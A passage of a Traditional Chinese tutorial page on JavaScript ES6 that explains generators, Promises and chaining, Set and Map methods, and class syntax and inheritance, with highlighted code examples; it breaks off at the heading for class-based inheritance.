<li>具體代碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> * <span class="title function_">gen</span>(<span class="params">arg</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(arg)    <span class="comment">// AAA</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> one = <span class="keyword">yield</span> <span class="number">111</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(one)    <span class="comment">// BBB</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> two = <span class="keyword">yield</span> <span class="number">222</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(two)    <span class="comment">// CCC</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> iterator = <span class="title function_">gen</span>(<span class="string">&#x27;AAA&#x27;</span>)</span><br><span class="line">iterator.<span class="title function_">next</span>()     <span class="comment">// 第一次無法接收參數</span></span><br><span class="line">iterator.<span class="title function_">next</span>(<span class="string">&#x27;BBB&#x27;</span>)   <span class="comment">// 第一個 yield 語句的返回結果</span></span><br><span class="line">iterator.<span class="title function_">next</span>(<span class="string">&#x27;CCC&#x27;</span>)   <span class="comment">// 第二個 yield 語句的返回結果</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p>實際應用：</p>
<ol>
<li>案例：一秒後輸出<code>111</code>，然後兩秒後輸出<code>222</code><ol>
<li><p>錯誤方式：平行處理異步任務</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">firstTask</span>()</span><br><span class="line"><span class="title function_">secondTask</span>()</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    因為異步任務之間有關聯度：先得到用戶數據，才可以獲取訂單數據</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>傳統方式：函數中嵌套後續函數</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">firstTask</span>()</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">secondTask</span>()</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    陷入回調地獄，不方便插入新的異步任務，也不方便維護</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>生成器方式（<font color="#f54747">避免回調地獄</font>）</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一個異步任務</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">firstTask</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">111</span>)</span><br><span class="line">        iterator.<span class="title function_">next</span>()     <span class="comment">// 第一個異步任務處理完調用 next 函數轉跳至下一個異步任務</span></span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二個異步任務</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">secondTask</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">222</span>)</span><br><span class="line">        iterator.<span class="title function_">next</span>()     <span class="comment">// 直到所有異步任務處理完畢</span></span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> * <span class="title function_">gen</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 使用 yield 語句分割異步任務</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="title function_">firstTask</span>()</span><br><span class="line">    <span class="keyword">yield</span> <span class="title function_">secondTask</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> iterator = <span class="title function_">gen</span>()</span><br><span class="line">iterator.<span class="title function_">next</span>()</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h2><ol>
<li>簡介：<ul>
<li><code>Promise</code>是 ES6 引入新的異步編程解決方案（主要解決回調地獄的問題）</li>
<li>語法上<code>Promise</code>是一個構造函數，用來封裝異步操作並可以獲取其成功或失敗的結果</li>
</ul>
</li>
</ol>
<h3 id="Promise基本使用"><a href="#Promise基本使用" class="headerlink" title="Promise基本使用"></a>Promise基本使用</h3><ol>
<li><p>實例化對象：</p>
<ul>
<li><code>Promise</code>是一個構造函數，因此可以實例化對象</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>)&#123;</span><br><span class="line">    <span class="comment">// 異步操作 - 成功</span></span><br><span class="line">    <span class="keyword">let</span> data = <span class="string">&#x27;Data&#x27;</span></span><br><span class="line">    <span class="title function_">resolve</span>(data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 異步操作 - 錯誤</span></span><br><span class="line">    <span class="keyword">let</span> err = <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">    <span class="title function_">reject</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>then</code>方法</p>
<ul>
<li>可以對異步操作成功與失敗進行後續操作</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">p.<span class="title function_">then</span>(</span><br><span class="line">    <span class="comment">// 異步操作成功執行</span></span><br><span class="line">    <span class="function">(<span class="params">value</span>) =&gt;</span> &#123;    <span class="comment">// value 就是 resolve 傳入的參數</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(value)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 異步操作錯誤執行</span></span><br><span class="line">    <span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;   <span class="comment">// reason 就是 reject 傳入的參數</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(reason)</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<ul>
<li>成功與失敗的回調可以編寫在異步操作的外面，避免回調地獄</li>
</ul>
</li>
</ul>
</li>
<li><p><code>catch</code>方法</p>
<ul>
<li>一個異步操作錯誤執行函數的「語法糖」</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 異步操作錯誤執行</span></span><br><span class="line">p.<span class="title function_">catch</span>(<span class="function">(<span class="params">reason</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(reason)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="Promise異步操作"><a href="#Promise異步操作" class="headerlink" title="Promise異步操作"></a>Promise異步操作</h3><ol>
<li><p><code>Promise</code>原型</p>
<ul>
<li><code>Promise</code>實例對象<code>then</code>方法的返回結果實際上也是一個<code>Promise</code>對象  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> result = p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 異步操作執行成功</span></span><br><span class="line">&#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 異步操作執行失敗</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result)     </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">    Promise&#123;</span></span><br><span class="line"><span class="comment">        [[Prototype]]: Promise</span></span><br><span class="line"><span class="comment">        [[PromiseState]]: &quot;fulfilled&quot;</span></span><br><span class="line"><span class="comment">        [[PromiseResult]]: undefined </span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span> </span><br></pre></td></tr></table></figure></li>
<li>注：<font color="#f54747"><code>PromiseState</code>的狀態是取決於回調函數的執行結果，並不是異步的操作結果</font></li>
</ul>
</li>
<li><p>四種回調函數的執行結果：</p>
<ol>
<li><p>第一種：沒有指定返回值</p>
<ul>
<li><code>PromiseState</code>為<code>fulfilled</code></li>
<li><code>PromiseResult</code>為<code>undefined</code>  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Promise</span>&#123;</span><br><span class="line">    [[<span class="title class_">Prototype</span>]]: <span class="title class_">Promise</span></span><br><span class="line">    [[<span class="title class_">PromiseState</span>]]: <span class="string">&quot;fulfilled&quot;</span></span><br><span class="line">    [[<span class="title class_">PromiseResult</span>]]: <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>第二種：返回非<code>Promise</code>對象的屬性</p>
<ul>
<li><code>PromiseState</code>為<code>fulfilled</code></li>
<li><code>PromiseResult</code>為返回值  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 非 Promise 對象的屬性</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>&#123;</span><br><span class="line">    [[<span class="title class_">Prototype</span>]]: <span class="title class_">Promise</span></span><br><span class="line">    [[<span class="title class_">PromiseState</span>]]: <span class="string">&quot;fulfilled&quot;</span></span><br><span class="line">    [[<span class="title class_">PromiseResult</span>]]: <span class="number">123</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>第三種：返回<code>Promise</code>對象</p>
<ul>
<li><code>PromiseState</code>為返回<code>Promise</code>對象的狀態</li>
<li><code>PromiseResult</code>為返回<code>Promise</code>對象的結果  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 是 Promise 對象的屬性</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&#x27;ok&#x27;</span>)   <span class="comment">// [[PromiseState]]: &quot;fulfilled&quot;</span></span><br><span class="line">                    <span class="comment">// [[PromiseResult]]: &quot;ok&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_">reject</span>(<span class="string">&#x27;error&#x27;</span>) <span class="comment">// [[PromiseState]]: &quot;rejected&quot;</span></span><br><span class="line">                    <span class="comment">// [[PromiseResult]]: &quot;error&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>第四種：拋出錯誤</p>
<ul>
<li><code>PromiseState</code>為<code>rejected</code></li>
<li><code>PromiseResult</code>為拋出的錯誤結果  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 拋出錯誤</span></span><br><span class="line"><span class="keyword">throw</span> <span class="string">&#x27;ERROR!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>&#123;</span><br><span class="line">    [[<span class="title class_">Prototype</span>]]: <span class="title class_">Promise</span></span><br><span class="line">    [[<span class="title class_">PromiseState</span>]]: <span class="string">&quot;rejected&quot;</span></span><br><span class="line">    [[<span class="title class_">PromiseResult</span>]]: <span class="string">&quot;ERROR!&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
</li>
<li><p>鏈式調用：</p>
<ul>
<li>由於<code>then</code>是可以返回<code>Promise</code>對象，所以<code>then</code>方法是可以鏈式調用</li>
<li>可以解決回調地獄問題</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">p</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 第二個異步操作</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>()</span><br><span class="line">    &#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;&#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 第三個異步操作</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>()</span><br><span class="line">    &#125;, <span class="function"><span class="params">reason</span> =&gt;</span> &#123;&#125;)</span><br><span class="line">    .<span class="title function_">then</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>實際案例：讀取多個文件</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 第一個異步任務</span></span><br><span class="line">    fs.<span class="title function_">readFile</span>(<span class="string">&#x27;./test.md&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(data)   <span class="comment">// 傳入數據</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 返回新的 Promise 實例對象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 第二個異步任務</span></span><br><span class="line">        fs.<span class="title function_">readFile</span>(<span class="string">&#x27;./test1.md&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">resolve</span>([value, data])  <span class="comment">// 將兩個異步任務數據寫入成一個數組並傳入</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 返回新的 Promise 實例對象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 第三個異步任務</span></span><br><span class="line">        fs.<span class="title function_">readFile</span>(<span class="string">&#x27;./test2.md&#x27;</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">            value.<span class="title function_">push</span>(data)    <span class="comment">// 將新數據壓入傳入的數組中</span></span><br><span class="line">            <span class="title function_">resolve</span>(value)      <span class="comment">// 將三個異步任務數據的數組傳入</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 完成所有異步操作之後的執行代碼</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(value.<span class="title function_">join</span>(<span class="string">&#x27;\r\n&#x27;</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 提供的新數據結構，類似於數組，但成員的值都是<font color="#f54747">唯一</font>的</li>
<li><code>Set</code>實現了迭代器 (<code>Iterator</code>) 接口，所以可以使用「擴展運算符」(<code>for...of</code>)進行遍歷</li>
</ul>
</li>
<li><p>基本使用：</p>
<ol>
<li><p>聲明<code>Set</code>：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> s = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="string">&#x27;Donald&#x27;</span>, <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;May&#x27;</span>, <span class="string">&#x27;Lily&#x27;</span>, <span class="string">&#x27;Donald&#x27;</span>])  <span class="comment">// 自動去除重複的元素</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>遍歷<code>Set</code>：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> v <span class="keyword">of</span> s)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(v)  <span class="comment">// Set 裡面的元素</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>屬性和方法：</p>
<ol>
<li><p><code>size</code>屬性 - 返回集合的元素個數</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">s.<span class="property">size</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>add</code>方法 - 添加一個新元素，返回當前集合</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">s.<span class="title function_">add</span>(<span class="string">&#x27;Tom&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>delete</code>方法 - 刪除元素，返回<code>boolean</code>值</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">s.<span class="title function_">delete</span>(<span class="string">&#x27;John&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>has</code>方法 - 檢測集合中是否包含某個元素，返回<code>boolean</code>值</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">s.<span class="title function_">has</span>(<span class="string">&#x27;May&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>clear</code>方法 - 清空集合，返回<code>undefined</code></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">s.<span class="title function_">clear</span>()</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>數學應用：</p>
<ol>
<li><p>去重</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[...<span class="keyword">new</span> <span class="title class_">Set</span>(arr)]   <span class="comment">// 將數組轉為集合，自動去重後再使用擴展運算符展開</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>交集</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[...<span class="keyword">new</span> <span class="title class_">Set</span>(arr)].<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> <span class="keyword">new</span> <span class="title class_">Set</span>(arr2).<span class="title function_">has</span>(item))</span><br><span class="line"><span class="comment">// 將一個數組去重後，使用 filter 過濾另一個數組，過濾出相同的元素</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>並集</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[...<span class="keyword">new</span> <span class="title class_">Set</span>([...arr, ...arr2])]     <span class="comment">// 將兩個數組合併再去重</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>差集</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[...<span class="keyword">new</span> <span class="title class_">Set</span>(arr)].<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> !(<span class="keyword">new</span> <span class="title class_">Set</span>(arr2).<span class="title function_">has</span>(item)))    <span class="comment">// 交集的相反</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><ol>
<li><p>簡介：</p>
<ul>
<li>ES6 提供的新數據類型，類似於對象，也是鍵值<code>key value</code>對的集合，但鍵<code>key</code>的返回不限於字符串，各種類型的值（包括對象）都可以當作鍵<code>key</code></li>
<li><code>Map</code>也實現了迭代器 (<code>Iterator</code>) 接口，所以可以使用「擴展運算符」(<code>for...of</code>)進行遍歷</li>
</ul>
</li>
<li><p>基本使用：</p>
<ol>
<li><p>聲明<code>Map</code>：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> m = <span class="keyword">new</span> <span class="title class_">Map</span>()</span><br></pre></td></tr></table></figure>
</li>
<li><p>遍歷<code>Map</code>：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> v <span class="keyword">of</span> m)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(v)  <span class="comment">// v 是一個數組包含兩個元素：第一個是 key，第二個是 value</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>屬性和方法：</p>
<ol>
<li><p><code>size</code>屬性 - 返回<code>Map</code>的元素個數</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">m.<span class="property">size</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>set</code>方法 - 添加一個新的元素，返回當前<code>Map</code></p>
<ul>
<li><code>key</code>可以是各種類型 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// key - 字符串  value - 字符串</span></span><br><span class="line">m.<span class="title function_">set</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;Donald&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// key - 字符串  value - function</span></span><br><span class="line">m.<span class="title function_">set</span>(<span class="string">&#x27;say&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// key - 對象  value - 數組</span></span><br><span class="line"><span class="keyword">let</span> key = &#123;</span><br><span class="line">    <span class="attr">school</span>: <span class="string">&#x27;CUHK&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">m.<span class="title function_">set</span>(key, [<span class="string">&#x27;CSCI&#x27;</span>, <span class="string">&#x27;CENG&#x27;</span>, <span class="string">&#x27;AIST&#x27;</span>])</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>get</code>方法 - 返回鍵名<code>key</code>對象的鍵值<code>key value</code></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">m.<span class="title function_">get</span>(<span class="string">&#x27;name&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>has</code>方法 - 檢測<code>Map</code>中是否包含某個元素，返回<code>boolean</code>值</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">m.<span class="title function_">get</span>(key)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>delete</code>方法 - 刪除一個元素，返回<code>boolean</code>值</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">m.<span class="title function_">delete</span>(<span class="string">&#x27;name&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>clear</code>方法 - 清空集合，返回<code>undefined</code></p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">m.<span class="title function_">clear</span>()</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h2><ol>
<li>簡介：<ul>
<li>ES6 提供了更接近傳統語言的寫法，引入了<code>Class</code>的概念，作為對象的模板</li>
<li>通過<code>class</code>關鍵字定義類</li>
<li>基本上，ES6 的<code>class</code>可以看作是一個語法糖，絕大部分功能，ES5 的構造函數也可以做到，新的<code>class</code>寫法只是讓對象原型的寫法變得更加清晰、更像面向對象編程語法</li>
</ul>
</li>
</ol>
<h3 id="Class基本使用"><a href="#Class基本使用" class="headerlink" title="Class基本使用"></a>Class基本使用</h3><ol>
<li><p>基本使用：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 創建類</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="comment">// 構造器</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span> = name</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 方法 - 必須使用該語法，不能使用 ES5 的對象完整式</span></span><br><span class="line">    <span class="title function_">eat</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I am eating&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p>靜態屬性與方法：</p>
<ul>
<li>ES5 中，實例對象和函數對象之間的屬性與方法不相通，實例對象只與函數的原型對象上的屬性和方法相通</li>
<li>而 ES6 的<code>class</code>裡所定義的屬性與方法和實例對象是相通</li>
<li>如果要兩者不相通，則需要加上<code>static</code>關鍵字，讓屬性與方法變成靜態</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> name = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">eat</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I am eating&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>getter</code>與<code>setter</code></p>
<ul>
<li>用於獲取與修改屬性時執行</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">name</span>()&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Get name&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// setter必須接收參數</span></span><br><span class="line">    <span class="keyword">set</span> <span class="title function_">name</span>(<span class="params">params</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Name has been changed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="繼承"><a href="#繼承" class="headerlink" title="繼承"></a>繼承</h3><ol>
<li><p>構造函數實現：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父構造函數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Phone</span>(<span class="params">brand, price</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">brand</span> = brand</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">price</span> = price</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 聲明父構造函數的方法</span></span><br><span class="line"><span class="title class_">Phone</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">call</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I am calling&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子構造函數</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">SmartPhone</span>(<span class="params">brand, price, color, size</span>)&#123;</span><br><span class="line">    <span class="title class_">Phone</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, brand, price)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">color</span> = color</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">size</span> = size</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 設置子級別構造函數的原型</span></span><br><span class="line"><span class="title class_">SmartPhone</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Phone</span>()</span><br><span class="line"><span class="title class_">SmartPhone</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">SmartPhone</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 聲明子構造函數的方法</span></span><br><span class="line"><span class="title class_">SmartPhone</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">change</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;I can change the time&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p><code>class</code>實現：</p>
